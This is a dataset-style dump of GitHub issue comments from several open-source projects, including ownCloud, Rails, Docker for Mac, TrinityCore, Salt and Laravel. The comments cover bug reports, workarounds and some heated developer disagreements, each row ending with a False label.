core/owncloud/24232/214814716,24232,"@friend don't worry about pointing fingers. Yes, there are issues on all sides, certainly. Sorry if I got overly defensive. About our internal discussions being public - that is a property of open source communities. At least, we like it that way. Our Debian friends made some stingy comments about us on their mailing list too - you won't see me come in and complain about them, I respect that that is the place where they have their discussions and they are free to say what they like. I'd be upset if it ended up in an announcement or if they send it to OUR mailing lists, that's different. What I mean is I see our and their mailing lists and infrastructure as our and their living rooms. With open doors and windows ;-) You can say what you like and if people overhear a conversation and get upset, well, perhaps they shouldn't have gone to that living room. But if you go to somebody else's' living room and yell at them, now THAT is impolite. I know about Experimental but it did show a scary direction development was taking (and even there could lead to data loss issues). Now, as said earlier, I won't say it is impossible to get this right, but we were (and are) very skeptical and then somebody doing it alone... I know, engineers are often like ""how hard could it be"" but the answer usually is ""harder than you thought"". Certainly in this case. ",,False
core/owncloud/24232/214814945,24232,"Meanwhile, I'm trying to figure out how to upgrade from the Debian packages to ours. I'm currently guessing the process would be something like this  make a backup of the database (and, if possible, the data folder) backup the config file and move the data folder in a temporary, safe place uninstall the current ownCloud packages install upstream ownCloud 8 packages and put in the data folder and config files run the updater via the command line  Any feedback on that, perhaps? I'd really appreciate help here ;-) ",,False
core/owncloud/24232/214817268,24232,@friend Some pointers where given by @friend in ,,False
core/owncloud/24232/214819997,24232,thanks for that! ,,False
core/owncloud/24232/214830847,24232,See  please ,,False
rails/rails/5798/4041078,5798,"Given a routes config with a namespace SomethingControllerapp/controllers/something_controller.rbuninitialized constant SomeNamespaceSomethingControllerapp/controllers/some_namespace/something_controller.rbve seen it happening multiple times now. This is pretty annoying, especially if you have a big test-suite that should prevent something like this from happening. It's hard to explain this to a customer that pays you a bunch of money because you pretend to test ""everything"" ... Please make sure that routing in development and especially in test environments yields the same results as in any other environment. ",,False
rails/rails/5798/5043732,5798,"What's your Rails version? If it's not the latest stable one, it'd be good to test with it. Routes shouldn't be different per environment, something looks very weird D. ",,False
rails/rails/5798/5043788,5798,"but i've seen this issue also in 3.0.x and 3.1.x. if i find the time i will try to reproduce this with 3.2.3 and add an example to reproduce it. it might also be some side-effect of devise or other dependencies... i thought it's worth adding as a bug, cause i've seen it happening multiple times and others might stumble over this too. ",,False
rails/rails/5798/5043823,5798,"Yeah it'd be good to have a way to reproduce it in a bare app. I'll try to take a look later as well, thanks. ",,False
rails/rails/5798/5044669,5798,i did a minimal app to reproduce the isse  the server and go to  should not give you an error. if you run it in production you get a 404 with an error in the logs ,,False
rails/rails/5798/5050105,5798,"First thing, leave the attitude at the door - nothing gets people more riled up than a sense of entitlement. If you check your  output you'll see that the controller should be namespaced, e.g The controller should be called . The reason that  works in development but not in production is due to a quirk with dynamic constant loading and ruby's constant lookup algorithm. The dynamic constant loading hooks into ruby’s constant lookup by supplying a custom  method, however before that is called ruby will search  for the constant. Since every class has  as an ancestor then it will return any matching top-level constants with the following warning Note that this isn't true for modules, e.g This leads me to suspect that the namespace you're using is a Active Record model - correct? This is why it's always better to post real-world code than pseudo-code - we don't have to guess what you're trying to achieve and often a crucial detail is left out in the translation. As for the testing - again I’m guessing but you're probably doing a functional test of the controller which won't pick up this error since that kind of test bypasses the request stack. If you do a integration test then it should fail as dynamic constant loading is turned off in the test environment The only way to ‘fix’ this issue is by removing the dynamic constant loading which would mean restarting the app every time you changed something in development, which given how everybody complains about boot time wouldn't be acceptable. If you don’t want to namespace the controller then just use a string , e.g ",,False
rails/rails/5798/5053851,5798,"@friend thx for elaborating on the issue. no, we are not using ActiveRecord at all. no, we are not doing functional tests but request spec. i added an example to the code. as what real-world code goes, i added an example app reproducing the error. i am not going to post any code that is under any private repo. i hope you can understand that there are actually people concerned with where their code goes. i am fine with rails not fixing this issue. i won't consider it a quirk, like you did. it's fine if it won't get fixed, but i think it's worth noting. i've seen people falling over it, i did it myself and i think that people will be glad if they find this issue here. ",,False
rails/rails/5798/5062296,5798,"@friend all I was suggesting was you post some of the controller boilerplate code, i.e. method names, class names, etc. - not actual implementations. As inflections are used quite heavily in routing often a inflection issue is masked when people post psuedo-code, hence my suggestion. Regarding your issue, the controller needs to be under the namespace. The fact that it works in development is a quirk of ruby itself which we can't fix - trust me I tried (I can dig out the old lighthouse tickets if you want). One thing puzzling me about you example app - why no test environment file? As soon as you add the standard test.rb file (minus the config for ActiveRecord and ActionMailer) then it fails. Without the test.rb file the environment defaults to development which is not what you want to be testing under. ",,False
rails/rails/5798/5063736,5798,"@friend i removed all the unnecessary code from the application and forgot to re-add the  file when i added the spec. i am still a little irritated, why this works at all. i would have thought that a missing environment file would cause the tests to fail, or prevent rails from booting in test env, because it explicitly sets the env ",,False
moby/moby/22753/154939729,22753,"Output of  Output of  Additional environment details (AWS, VirtualBox, physical, etc.) Steps to reproduce the issue 1. 2. 3. Describe the results you received No docker0 and absolutely no way to connect to services running on docker host via bridge gateway. I have tried it all and thought I was going crazy, then I tried exactly the same things on my ubuntu host with zero problems Describe the results you expected I would like to be able to connect to my local redis and other services without having to dockerize these... ",,False
moby/moby/22753/299362839,22753,"I just wanted to add a plus one/subscribe along with everyone else in this thread, and add another voice to the feature request of being able to easily access docker containers through the bridge interface on unique/custom IP addresses. I was ramming my head into the wall for at least 4 hours trying to figure out why I couldn't get any documented examples working, until I somehow found this issue, describing the problem perfectly. For now, the workaround mentioned by @friend ( seems to work passably well. I'm adding experimental Docker support to Drupal VM using the instructions  Add a host to  with  (e.g. ) Create an alias on the loopback interface  Bring up a container with the following pseudocompose version ""3"" services app  image image-name  ports    - 192.168.1.1008080    - 192.168.1.100443443  [...]    This seems to work perfectly for me, and though it currently requires a couple manual steps (which are avoided if using other tools on top of Docker... something I don't want to force my users to do), it allows me to almost reach Docker nirvana on Mac. So thanks for the workaround, and I hope you can find a way to get the bridge network working soon (or just abandon macOS &lt; 10.12 😏) ",,False
moby/moby/22753/299364230,22753,"@friend thank you sooo much, 192.168.65.1 has solved my issue. I hope this doesn't get changed in the future, unless they find a cleaner solution. As of Docker for Mac 17.0.3.1 this has allowed my container to talk to the MySQL server running on my machine's localhost. ",,False
moby/moby/22753/299399253,22753,@friend I'm glad it worked for you. Thanks for the feedback! ,,False
moby/moby/22753/313679559,22753,"Hi, I am reading the docs here  and I am trying to use the the special Mac-only DNS name mentioned there . If I do a ping on a terminal inside the docker container, it gets resolved to 192.168.65.1, and doing a curl to an app running on my mac retrieves the expected result. I am using this image  and I can open a Chrome browser there. So I wanted to go to  and the connection was refused. However, doing  works. Am I missing something? I wanted to start using the . ",,False
moby/moby/22753/326294741,22753,"I think that using  was a poor decision. The whole point of containers is that they are portable and should have no dependency on what type of host they reside. If my team is half Windows users and half Mac, then the code inside of our containers will have to be configured differently. I'm glad there's a hostname approach, I just think the meeting where this approach was decided should have lasted 5 more minutes. ",,False
moby/moby/22753/330376075,22753,worked. Hilarious. ,,False
moby/moby/22753/340436460,22753,"I worked around this problem by reverting back to docker-machine for Mac. The docker machine VM  is a Linux distro which means that it creates a docker0 interface which has access to the private network range of the docker containers. Then, on my host mac machine, I created a route for the 172.18.x.x address range of the containers which points to the ip address of the docker machine instance (192.168.99.100 in my case). This allows packets destined for the private container network to be forwarded by my mac OS to the IP address of the linux VM of docker machine, which knows how to reach the private containers and forwards the packets to them directly. Creating the route to the docker machine vm for the private container network You can get the address for the container network by using  or . ",,False
moby/moby/22753/400663231,22753,You can find ip of the host in docker for mac this way ,,False
moby/moby/22753/449775560,22753,I had the same problem whilst using osx on home wifi. In the office it worked fine on wifi yet i guess they have a typical office setup with ip addresses created on the fly. I ran the command  then i  looked at the ports section mine says 0.0.0.080 i didnt think it would work yet it did i tried that ip address in the browser and it works fine. I have also updated /etc/hosts on the mac to 0.0.0.0 for each domain and it works perfect. sometimes the simple and obvious is the best answer. ) ,,False
moby/moby/22753/449776679,22753,Run this command  docker ps` if it says 0.0.0.0 then that  will  work fine once the port is exposed  or any other ip address written  there. ,,False
rust/rust-lang/7803/16774829,7803,"I'm surprised that I was unable to find an open issue for this. Read  for the basic idea. From what I understand the general attitude is favorable, but people have yet to decide whether to salvage the  sigil or to require  to now be written . Let's try to defer these syntax decisions and just get GC-in-a-library working as soon as possible, if people agree that it is desirable. Nominating for 0.8. Aggressive, but I feel like we're going to suffer if we try to put this off for too long. ",,False
TrinityCore/TrinityCore/10510/17901778,10510,"The quest itself might work, but it is still not finished. 1 text fails to execute, even when forced by an in-game data set command.  The end data set text also doesn't execute, nor do the actions.  Mirror aura is lost on Future You's evade mode; the core is only set to allow a vehicle aura on evade, anything else will be wiped out, including the clone aura. I don't have much time to finish those things, so you can test it out if you want, and add suggestions. ",,False
TrinityCore/TrinityCore/10510/22444187,10510,"Creature entry 27898 has EventAI scripts, but its AIName is not 'EventAI' - possible AI-mismatch? Creature entry 27900 has EventAI scripts, but its AIName is not 'EventAI' - possible AI-mismatch? ",,False
TrinityCore/TrinityCore/10510/22444244,10510,"Nothing in my DB's, but if there really are any EAI's ",,False
TrinityCore/TrinityCore/10510/22444257,10510,"Yup, there are! ",,False
TrinityCore/TrinityCore/10510/22444832,10510,"Also first creature_text should be ""'Hey there,"" ",,False
TrinityCore/TrinityCore/10510/22444892,10510,"No, it's ""Hei there..."" that's sniff info. And it's also ""Future you"" an npc that is your clone from the future, which in terms explains why the text is ""Hei"", it's something usually a player would say.  Would be best to change it though, ""Hei"" does sound rather strange. ",,False
TrinityCore/TrinityCore/10510/22445113,10510,"""Future You whispers Hey there, &lt;name&gt;, don't be alarmed. It's me... you... from the future. I'm here to help."" ",,False
TrinityCore/TrinityCore/10510/22445129,10510,"Now go for the redux part - Mystery of the Infinite, Redux plus one ",,False
TrinityCore/TrinityCore/10510/22445136,10510,Oh and look here  at 720p ,,False
TrinityCore/TrinityCore/10510/22445165,10510,"I already changed it to ""Hey"", but I still have no idea why the sniff would show a ""Hei"", unless it was tampered by mistake. I'm not going to do redux until this one is finished. ",,False
TrinityCore/TrinityCore/10510/22454418,10510,"Great work Kirk!... as always. I would like to state that the quest is fully completable now, but there are a few cosmetic bugs with it. Just a few notes, I apologize if you already know this.  First creature_text   Does not appear to me.  Future You's character model disappears after he whispers you. ""I can't believe I used to wear that"". You can still target him by typing /tar future, but his character model is gone. Although mobs still will attack him while he's invisible!  He does not talk to you after saying ""I can't believe I used to wear that."" I don't appreciate his sassy attitude very much. xD  Weapons do not appear on Future You. He fist punches everything.  Future You has a 'PvP' flag, I could be wrong, but I don't think he's supposed to be flagged for PvP.  Nozdormu does not appear after the quest is finished.   Keep up the good work! ",,False
TrinityCore/TrinityCore/10510/22455145,10510,"The quest itself might work, but it is still not finished. 1 text fails to execute, even when forced by an in-game data set command. &lt;&lt;&lt;&lt; ",,False
TrinityCore/TrinityCore/10510/22457802,10510,"Ok forget, this was nothing to do... ",,False
TrinityCore/TrinityCore/10510/22458521,10510,"Updated the above post with new changes, every aforementioned issue should now be fixed; This including, the text that didn't show, the fail quest if the hourglass is destroyed, the despawn set when the quest is finished. The only real issue that remains (And this is core sided) is that all auras save for one excluded are wiped form the npc on evade, we must find a circumvention for this aura or simply add it as an exclusion in the core also. Currenty @friend is working on this, and will keep you posted. Test out the updated script, and tell me if there are issues. And also note, if the Future You npc ends combat it will evade and lose it's clone aura, this will automatically make the script not work for him anymore, and he won't execute any text lines, or any lines for that matter; keep him in combat to test the script at all times. ",,False
TrinityCore/TrinityCore/10510/22460343,10510,"Quest does not complete now, even when Future You stays in combat the entire event. Future You's weapons are still not shown. Nozdormu still does not appear, but that probably won't be fixed until and update is released to keep Future You from disappearing out of combat. As the last two lines of creature_text are not displayed. Otherwise that, all creature_text is now working as long as Future You stays in combat. ",,False
TrinityCore/TrinityCore/10510/22460414,10510,Did you try cleaning client cache? ,,False
TrinityCore/TrinityCore/10510/22460649,10510,"Uhm, the quest should complete just fine; Also, Nozdormu only appears if the quest status is completed, because that aura is in spell_area. The last two lines should also appear, no idea why they don't for you. Did you try copying the new script up there? It is updated. ",,False
TrinityCore/TrinityCore/10510/22460703,10510,"Gah, such a stupid mistake. Thank you Chazy, I will be going to bed now. Quest now completes as long as Future You stays in combat. Nozdormu does appear at the end now along with the two creature_text lines. Weapons are still not displayed on Future You. ",,False
TrinityCore/TrinityCore/10510/22460795,10510,"That's a minor cosmetic bug, I can't deal with it now; what I really want done is to prevent the clone aura being removed. I'm glad everything else is fine now. Also, for me, a weapon and a shield appear on Future You, but not the ones I own, rather totally different ones. ",,False
TrinityCore/TrinityCore/10510/22494493,10510,"Okay, aura issue fixed in faa2ec9 Please compile with that commit and re-try the quest now. Only thing left to fix now is getting the clone to not bounce off data sets. If he doesn't receive them, he won't execute script. ",,False
TrinityCore/TrinityCore/10510/33981901,10510,@friend  Sorry but i have a question to your commit. You set smart_ai for 27896 (NPC_AI) and 27897(NPC_ID) but you dont insert a smart_script for this id's. ,,False
pandas/pandas-dev/7750/37810421,7750,"6848 is no where mentioned in the release notes. There's a single item on changing to quicksort, but it doesn't explicitly warn that the sort was previously stable and now isn't. There's also no warning about  changing as well. That API has been around forever and afaict nothing was gained by breaking it. This was a fairly reckless change in my opinion, I do wish the current maintainers cared more about backwards-compatibility then they seem to in the latest releases. ",,False
salt/saltstack/3618/10700102,3618,"When I try to make use of the reactor, I end up with an Assertion failed message. After that message, no minions can authenticate to the master and trying to stop the master process through the init script fails. I do see the master process running and need to use killall to stop it. If I then remove the reactor piece of the master config and start the master process, everything starts working again. root@friend~# /etc/init.d/salt-master start Starting salt-master daemon Assertion failed ok (mailbox.cpp84) . root@friend~# /etc/init.d/salt-master stop Stopping salt master control daemon ...start-stop-daemon warning failed to kill 10113 No such process . root@friend~# killall salt-master root@friend~# cat /etc/salt/master timeout 30 log_level warning state_verbose False  file_roots   base     - /srv/salt     - /srv/data  pillar_roots   base     - /srv/pillar  ext_pillar   - boothost_templates {}  reactor   - 'auth'     - /srv/reactor/empty.sls  root@friend~# cat /srv/reactor/empty.sls  return_true   cmd.run     - name echo 'hi'  ",,False
salt/saltstack/3618/13192548,3618,I take it you are using git head? Do you have zombies when this happens? ,,False
salt/saltstack/3618/13192906,3618,"Yes, I'm using head. I don't know how to tell if I have zombies or not... I'm going to guess that I do because that would explain the attitude the processes give me. When it's pissed, ps aux shows me this. It's set to have the default number of processes. root     10364  1.3  2.0 136600 21412 ?        S    1105   000 /usr/bin/python /usr/bin/salt-master -d root     10371  0.0  1.5 170972 16076 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10374  0.0  1.5 170300 15564 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10379  0.0  1.5 186692 15808 ?        S    1105   000 /usr/bin/python /usr/bin/salt-master -d When it's working fine... root     10418  0.0  1.6 235960 16444 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10419  0.0  2.0 136600 21408 ?        S    1105   000 /usr/bin/python /usr/bin/salt-master -d root     10426  0.0  1.5 170960 16068 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10427  0.0  1.5 170824 15852 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10428  0.1  2.2 222300 22768 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10435  0.1  2.2 287840 22768 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10436  0.1  2.2 287840 22764 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10437  0.1  2.2 287840 22772 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d root     10438  0.1  2.2 287848 22768 ?        Sl   1105   000 /usr/bin/python /usr/bin/salt-master -d ",,False
salt/saltstack/3618/13193033,3618,"ok, this is not zombies, those are all S and Sl flags for healthy processes, it looks like the procs are failing to start! ",,False
salt/saltstack/3618/13193323,3618,"They don't love me... ( Is there something I probably did wrong or is this a bug? If it's a bug, please let me know what I can do to help fix it. ",,False
salt/saltstack/3618/13193614,3618,"meh, I can't reproduce this. How old is your git head? ",,False
salt/saltstack/3618/13193766,3618,It's from yesterday. I'll try it on the latest now. ,,False
salt/saltstack/3618/13193866,3618,.. same thing ,,False
salt/saltstack/3618/13194038,3618,What version of Zeromq are you running? ,,False
salt/saltstack/3618/13194118,3618,This is Debian right? ,,False
salt/saltstack/3618/13194173,3618,Yup. root@friend~# apt-cache policy python-zmq python-zmq   Installed 2.2.0-1   Candidate 2.2.0-1   Version table  *** 2.2.0-1 0         800  wheezy/main amd64 Packages         700  unstable/main amd64 Packages         100 /var/lib/dpkg/status  ,,False
salt/saltstack/3618/13194821,3618,What version of libzmq are you running? is it libzmq 2.2.0 or 3.2? I think this might be us running into a know libzmq 2 bug (which would explain me having issues reproducing this) ,,False
salt/saltstack/3618/13194880,3618,The package name is libzmq1 ,,False
salt/saltstack/3618/13195580,3618,"So this Assertion happens because of a bug in libzmq 2, and if a zmq context it passed through to a new thread or process, I have verified that the later is not happening in the code anywhere. So I am wondering what apt-cache policy libzmq1 says, and if updating to libzmq3 will fix it ",,False
salt/saltstack/3618/13197460,3618,"#  apt-cache policy libzmq1 libzmq1   Installed 2.2.0+dfsg-2   Candidate 2.2.0+dfsg-2   Version table  *** 2.2.0+dfsg-2 0         800  wheezy/main amd64 Packages         700  unstable/main amd64 Packages         100 /var/lib/dpkg/status  I also installed libzmq3 from experimental. I ran into the same problem. The salt-master depends on python-zmq which depends on libzmq1. So I have both libzmq1 and libzmq3 installed right now. I'm not sure how to make sure I'm using libzmq3(3.2) instead of libzmq1(2.2). I could install salt from source on the system, but I very much prefer build the package on our apt mirror and install it from there... #  apt-cache policy libzmq3 libzmq3   Installed 3.2.2+dfsg-1   Candidate 3.2.2+dfsg-1   Version table  *** 3.2.2+dfsg-1 0           1  experimental/main amd64 Packages         100 /var/lib/dpkg/status  ",,False
salt/saltstack/3618/13198127,3618,"If I change the dependency in the package to libzmq3 instead of python-zmq and install libzmq3 without either python-zmq or libzmq1 (its dependency) then I get ""ImportError No module named zmq"". I guess I don't really have any idea how to get zmq3 without zmq1. ( ",,False
salt/saltstack/3618/13198447,3618,"Sorry, I should have been more specific, libzmq3 is just the latest zeromq, it is much better and we leverage it for a lot of new features. you still need pyzmq installed, since that is the python bindings to libzmq, although you may need to recompile pyzmq after libzmq3 is installed ",,False
salt/saltstack/3618/13198473,3618,"I think there are packages out there, lemme look ",,False
salt/saltstack/3618/13198658,3618," doesn't even have 3.2. I installed libzmq3 and then rebuilt pyzmq with ""easy_install -U pyzmq"" and now when I start the salt master, I get this - Starting salt-master daemon Assertion failed ok (bundled/zeromq/src/mailbox.cpp84) I'll wait until I give you a chance to do smart people research. ) ",,False
salt/saltstack/3618/13198966,3618,"yes, pyzmq 2.2.0 works against zeromq 3.2, it is kind of confusing, but we are still getting the assertion!!! Lemme keep trying to find out what is happening ",,False
salt/saltstack/3618/13199186,3618,"man, if I could get on your system and start throwing in debug output this would be a lot easier to find.... I am still looking ) ",,False
salt/saltstack/3618/13199928,3618,"I am stumped, I can't reproduce it, I can't find any legitimate place in the code that would cause this, libzmq3 does not seem to fix it. I am still thinking and researching, but I am drying up on ideas.... ",,False
salt/saltstack/3618/13202409,3618,If you were to chat with me on IRC I could do everything you ask as you ask me to do it. I unfortunately wouldn't be able to let you into the system. ,,False
salt/saltstack/3618/13203201,3618,"Interesting... If I leave out the reactor part, I wind up with ""salt-master -l trace"" doing exactly what I expect. If I add the reactor part of the config and run ""salt-master -l trace"" and what I see is this,  not pressing Ctrl+C to kill it. It seems to just stop running but salt-master processes continue to run in the background. ",,False
salt/saltstack/3618/13203326,3618,"This is the part that I find interesting from that... [TRACE   ] Added extra.config to grain [DEBUG   ] SaltEvent PULL socket URI ipc///var/run/salt/master/master_event_pull.ipc [INFO    ] Setting up the master communication server [TRACE   ] Added extra.shell to grain Assertion failed ok (mailbox.cpp84) Aborted root@friend~# [DEBUG   ] loading module in ['/var/cache/salt/master/extmods/modules', '/usr/lib/pymodules/python2.7/salt/modules'] [DEBUG   ] Skipping /var/cache/salt/master/extmods/modules, it is not a directory [DEBUG   ] Loaded groupadd as virtual group [TRACE   ] Added group.add to module  It shows the prompt but keeps truckin' along. [DEBUG   ] Loaded sysmod as virtual sys [TRACE   ] Added sys.doc to runner  root@friend~# ps aux | grep salt root     16563  0.0  2.1 136884 21620 pts/1    S    1419   000 python /usr/bin/salt-master -l trace root     16570  0.0  1.5 175036 16140 pts/1    Sl   1419   000 python /usr/bin/salt-master -l trace root     16571  0.0  1.5 174500 15660 pts/1    Sl   1419   000 python /usr/bin/salt-master -l trace root     16578  0.0  1.5 191024 15896 pts/1    S    1419   000 python /usr/bin/salt-master -l trace  ",,False
salt/saltstack/3618/13203805,3618,"So far, I've managed to get to line 130 ""self._popen = Popen(self)"" of process.py before I see the error. I have no idea what I'm doing here, I'm just able to see it getting that far and that being the line where things go boom. ",,False
salt/saltstack/3618/13204484,3618,"This does make it look like a zmq context is being passed into a new process, I am going to hop into IRC ",,False
framework/laravel/2513/21197899,2513,"Can we get some form helper for Laravel for the likes of &lt;input id=""movie"" type=""number"" value=""0""/&gt;  More info on the number input at ",,False
framework/laravel/2513/26568963,2513,Is this too hard? ,,False
framework/laravel/2513/26569084,2513,"Don't need the attitude. If you look at the form helpers, there's a pattern [[ Formtype ]] Formtextarea Formtext Formselect So I suggest Formnumber ",,False
framework/laravel/2513/26569374,2513,It should be merit to ask if the existing structure if too hard to implement or too limiting which need to result for an alias to be added. Anyway it been asked/request before and the response was ,,False
framework/laravel/2513/26569946,2513,"Alrighty then. This would hardly be an alias though of something already there, it would just be a new helper. ",,False
framework/laravel/2513/34226078,2513,"Formnumber only if you to create the method inside of FormBuilder. You should call {{ Forminput('number', 'name of input') }} ",,False
framework/laravel/2513/40646019,2513,"You can use this file to create alias for the remaining 11 HTML5 elements (email &amp; URL are enabled out of the box)  enables Inputdate('input_name', 'input_value', $options_array), etc ",,False
bootstrap/twbs/16338/70364857,16338,"I'm not familiar with this repository, and I can't ascertain the bootstrap attitude toward userAgent styles. Regardless, Chrome OSX 42.0.2311.90 changes the  style of html5 time elements. Is this something bootstrap should rein in or is it a  fix? ",,False
bootstrap/twbs/16338/96114171,16338,Probably don't need to do much here since we override much of those styles with  anyway. Thanks for the heads up though! ,,False
bootstrap/twbs/16338/96121648,16338,Interesting note Their  can't be totally overridden; their calculated  is always some kind of flex. Setting  just makes it compute to  (instead of ). ,,False
TrinityCore/TrinityCore/6137/4033130,6137,,,False
TrinityCore/TrinityCore/6137/5131126,6137,this is already in the database thus does not require adding ,,False
TrinityCore/TrinityCore/6137/5138949,6137,I'm currently not using the latest DB so I can't be certain they ware fixed but I don't remember seeing the fix and the values are different in my version. ,,False
TrinityCore/TrinityCore/6137/5711805,6137,@friend what part of the code below would you say is already in the DB? Do compare the values from my fix above with the values from the current DB below before you answer. Please reopen the issue since it is obvious the drop chance values are wrong in TDB 11.46 updated to e74135946d2cb2b6a522cfa979cfef0263a9fd8e and this can be confirmed by the link I provided in the first post. ,,False
TrinityCore/TrinityCore/6137/5734582,6137,"The drop chances that are in DB atm are very similar... 0.6 vs 0.5, 0.5 vs 0.4 ",,False
TrinityCore/TrinityCore/6137/5759080,6137,Yet they are wrong enough to need fixing &lt;IMG&gt;,,False
TrinityCore/TrinityCore/6137/5760243,6137,"If you, in-game, can tell that an item drops 0.2% more using a different DB... I don't even know what to say. Minimum is 0, maximum is 100 and we are arguing over decimals... Thanks for the fix but I think our time would be better wasted with something more serious. ",,False
TrinityCore/TrinityCore/6137/5761487,6137,"I give up, when I was told by others they won't post there fixes here because of the dev's attitude I did not understood them. Now I think I finally do understand ... You just told me that you don't care that the ""Elegant Dress"" (  ) doesn't have the same chance to drop as Spring Rabbit's Foot, Spring Circlet, Spring Flowers and Spring Robes (they should have the same chance) just because you don't think it'll have any difference for the players if the value is 0,3% less than is should be... You also told me that you don't care if the values in TDB are not correct and won't apply a fix because you consider it a waste of time. ",,False
TrinityCore/TrinityCore/6137/5761539,6137,"That means you can't accept a no? Look at the god damn values again and tell if it is worth it, and why. ",,False
TrinityCore/TrinityCore/6137/5763138,6137,"You are constantly rejecting fixes because they are not blizzlike, yet now you are rejecting a blizzlike fix because you think that the difference in the values is not big enough ... But the result is that players are wasting hours farming the ""Elegant Dress"" item during the 1 week Noblegarden event in hopes of getting the ""Dressed for the Occasion"" achievement year after year and can't get it while getting multiple copy's of the other 4 items that are supposed to have the exact same chance to drop ... Do note that while minuscule in terms of 0-100% the difference in drop chance is 250% ",,False
TrinityCore/TrinityCore/6137/5764273,6137,"Constantly rejecting fixes? Do you have anything to back that statement? And what makes you think that your values are more correct than the current ones? I don't know if our values are correct either but since they are already in the DB and your changes introduce no significant changes, I (we) are not pushing it. Wowhead is based on empirical data, it is not a reliable source of data. There's no good way to get the exactly correct values (except for those loot table where you have, e.g, 10 items in a group and you know that one of those items has to drop) And about the 250%, I think your math is a little bit off. I would not like to continue this useless and stupid discussion. ",,False
TrinityCore/TrinityCore/6137/5765015,6137,nelgalno if you wish to change %'s then post udate queries. above fix is not needed thus rejected. ,,False
TrinityCore/TrinityCore/6137/5766603,6137,"&lt;b&gt;Do you have anything to back that statement?&lt;/b&gt;  what makes you think that your values are more correct than the current ones?&lt;/b&gt; I did some research before posting here as evidenced by the links above. &lt;b&gt;And about the 250%, I think your math is a little bit off.&lt;/b&gt; 0.2 + 0.3 = 0.5% == 100% + 150% = 250% &lt;b&gt;post udate queries&lt;/b&gt; ",,False
TrinityCore/TrinityCore/6137/5770914,6137,"yes the loot% on your thottbott, wowhead and other links are all momentairy, i challenge you to check it again in 2 weeks or even in 5, and see that the %chances have changed yet again. therefor you should NOT use hardcoded ChanceOrQuestChance but group them accordingly and set a rough chance for them as a whole. 0.2+0.3 = 0.5 (that is correct) but the increase in % = 0.3/0.2 = 150% not 250% ",,False
TrinityCore/TrinityCore/6137/5770922,6137,"fix is rejected, my final statement, and im the loot dev ",,False
TrinityCore/TrinityCore/6137/5774664,6137,"They held those values since the time of the Noblegarden event == more than a month ago ... If we assume that the current TDB value is 100% + the 150% increase I suggest equals 250% ... P.S. I don't care, it is your choice to accept or reject the fix. I know that I did my best to provide the information/evidence that the values in TDB are incorrect and you choose to ignore it ... ",,False
framework/laravel/6531/50444331,6531,"With the rewrite of Homestead v2, it is now considerably more difficult (if not impossible) to share development environment code on a project. One of the key benefits of Vagrant is committing the  to a repository and thereby having all developers working from the same environment. (Isn't that the whole point of Vagrant?) But with Homestead 2, all your config lives in your own personal  directory, and is non-shareable. I was never really a fan of the instructions for Homestead 1 which advocated using a single, central clone of the homestead repository. (Am I really the only one who uses separate homestead boxes per project? Do other people prefer not to segregate environments? That's like developing on our own little shared hosting boxes, allowing different project code and installation requirements to co-mingle.) But at least with the original Homestead it was possible to put the homestead files inside your project's repo (I used , since I'd customize the provision scripts.) With Homestead 2 and , the ability to customize the environment is getting better (and somewhat more reproducible), but taking a huge step backwards in shareability. While bundling homestead commands as a composer project is great, further centralizing config seems to be taking Homestead in a wrong direction... ",,False
framework/laravel/6531/65021377,6531,"After further thought, I've come to believe Homestead is designed around having developer-centric environments, as opposed to project-centric environments. Which seems entirely backwards to me. Sure, it works if you're developing a very basic application* and the stock Homestead install works out of the box for your project, or if you're working alone. But I've worked on very few projects that have the same server-side software requirements or are limited to a single developer. Need to add elasticsearch? Switch to MariaDB? What about build tools other than grunt or gulp? Want to use the awesome maildev during development? Homestead allows you to customize your development environment, and do so in a way that isn't affected by your host system. But it doesn't allow you to share those customizations. Which is a huge step backwards from the massive improvements (and productivity gains) Vagrant has brought to the development process. * I assume some will argue that the default Homestead box is designed to work with Forge, which is very probably true. But will Forge really never get the ability to add provision steps and add customize server environments during deployment? Maybe not, but if not, it will remain relatively niche. I love Homestead and Forge because they provide clean, solid base environments on which I can develop. But if I have to give all that up and start from scratch as soon as I need to customize my environment, that doesn't make me code very happy. I hope we can figure out a better way to manage development and deployment environments using the full power of the tools we have... ",,False
framework/laravel/6531/65022014,6531,Couldn't you still use a subtree for the latest version though? The repository is still there laravel/homestead I'm sure you're not required to install the global Composer package and use the  command. ,,False
framework/laravel/6531/65023134,6531,"Not really. The Vagrantfile already assumes a  directory. And I can only guess it's going to go more down this path. On top of that, the subtree solution isn't a great one to begin with. It's hard to maintain as soon as you need to make changes to the Vagrantfile or homestead.rb, in which case you're basically giving up on future upstream changes. Which, from what I can tell, is one of the reasons for the changes in Homestead 2. But I just think it's limiting Laravel development more than expanding. What I'd be hoping for is more of a modular system, where concepts like  are a bit more flexible and can be loaded from a project (or also a home directory if desired). Something like the way  and other configuration systems work, maybe using Vagrantfile inheritance. It adds complexity, but there's no reason it needs to be exposed to most developers. If working out of a single shared box is fine for your needs, great. I just wish Laravel offered support for better practices from the start. ",,False
framework/laravel/6531/65023305,6531,Ah you're right. I didn't even take a look in there. I agree that more flexibility for more advanced developers should be as big a priority as making it easy for newer developers to quickly get up and running. But I'm hardly one to comment on how it would be achieved as I'm not exactly a pro at Vagrant or provisioning servers. grinning ,,False
framework/laravel/6531/65371411,6531,I was about to propose a way to fix this in your  file you could have a  (name negotiable) array that has file paths to the root of a laravel install and it can read the a  for the site specific stuff like provision scripts and database names and site public directory and local url just an idea I will be ready to submit a pull request later about this ,,False
framework/laravel/6531/65380358,6531,"Agreed, I prefer to have separate boxes per project and am currently rolling my own solution as well.  Homestead 2 indeed makes this more difficult.  I want my project to configure the box. ",,False
